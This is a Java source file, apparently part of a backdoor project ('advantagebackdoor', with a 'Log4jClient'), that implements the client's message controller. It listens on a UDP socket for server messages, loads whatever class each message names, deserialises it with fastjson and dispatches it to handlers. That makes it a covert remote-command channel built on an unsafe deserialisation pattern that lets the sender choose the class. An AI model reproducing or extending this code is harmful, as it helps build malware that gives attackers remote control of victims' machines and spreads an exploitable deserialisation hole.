package me.faintcloudy.advantagebackdoor.client.message;

import com.alibaba.fastjson.JSON;
import org.json.JSONObject;
import me.faintcloudy.advantagebackdoor.client.Log4jClient;
import me.faintcloudy.advantagebackdoor.api.message.MessageHandler;
import me.faintcloudy.advantagebackdoor.api.message.MessageListener;
import me.faintcloudy.advantagebackdoor.api.message.NetworkMessage;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.DatagramPacket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class NetworkMessageController {

    List<MessageListener> listeners = new ArrayList<>();
    public void call(NetworkMessage message)
    {
        for (MessageListener handler : listeners) {
            for (Method method : handler.getClass().getMethods()) {
                if (method.isAnnotationPresent(MessageHandler.class) && method.getParameterTypes().length == 1)
                {
                    if (method.getParameterTypes()[0].equals(message.getClass())) {
                        try {
                            method.invoke(handler, message);
                        } catch (IllegalAccessException | InvocationTargetException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }

    public NetworkMessage deserialize(String text)
    {
        System.out.println(text + " from server");
        JSONObject jsonObject = new JSONObject(text);
        Class<? extends NetworkMessage> clazz = NetworkMessage.class;
        try {
            clazz = (Class<? extends NetworkMessage>) Class.forName(jsonObject.getString("theClass"));
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

        return JSON.parseObject(text, clazz);

    }

    public void startListening()
    {
        this.register(new BasicMessageHandler());
        this.register(new RequestListener());
        new Thread(() -> {
            while (true) {
                try {
                    byte[] bytes = new byte[1024];
                    DatagramPacket packet = new DatagramPacket(bytes, bytes.length);
                    Log4jClient.getInstance().getSocket().receive(packet);
                    try {
                        NetworkMessage message = this.deserialize(new String(packet.getData(), 0, packet.getLength(), StandardCharsets.UTF_8));
                        this.call(message);
                    } catch (Exception e) {
                        System.out.println("解析信息时发生错误: ");
                        e.printStackTrace();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public List<MessageListener> getListeners() {
        return listeners;
    }

    public void register(MessageListener listener)
    {
        listeners.add(listener);
    }
}
